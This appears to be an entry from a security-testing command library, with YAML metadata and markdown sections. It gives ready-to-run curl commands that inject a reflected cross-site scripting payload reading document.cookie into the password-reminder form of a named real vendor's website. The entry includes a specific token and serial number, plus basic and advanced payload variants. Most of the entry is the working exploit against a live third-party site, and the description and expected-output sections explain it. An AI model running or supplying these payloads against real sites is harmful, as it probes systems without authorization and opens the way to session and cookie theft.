---
id: curl-xss-post-2024
data: >-
  curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d
  "token=a016902ceaeb6ae91c21302631fbbcfc" -d
  "SN=818198181891891981981981516518198198" -d "OrderId=" -d "Submit=Send
  E-mail" -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--"
tags:
  - xss
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:43.080Z'
verified: false
validated: true
submitted: true
---
# curl-post-xss-payload

## Command

```bash
curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d "token=a016902ceaeb6ae91c21302631fbbcfc" -d "SN=818198181891891981981981516518198198" -d "OrderId=" -d "Submit=Send E-mail" -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--"
```

## Description

This command uses curl to send a POST request to the Acronis forgot password form, injecting an XSS payload into the 'c' parameter to test for reflection and execution. It simulates form submission with required fields and the malicious input.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-d` | Data fields for form parameters (token, SN, etc.) | Yes |
| `c=...` | The XSS payload parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d "c=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -X POST https://www.acronis.com/en-us/my/remind/index.html -d "token=example" -d "c=1\"<!--><Svg OnLoad=(confirm)(document.cookie)<!--" -v
```

## Expected Output

HTTP response body reflecting the payload if vulnerable; in browser context, JS execution like a confirm dialog with cookies. Use -v for verbose headers.

## Related

- [[Related Procedure: Test-Reflected-XSS-in-Forgot-Password-Form]]
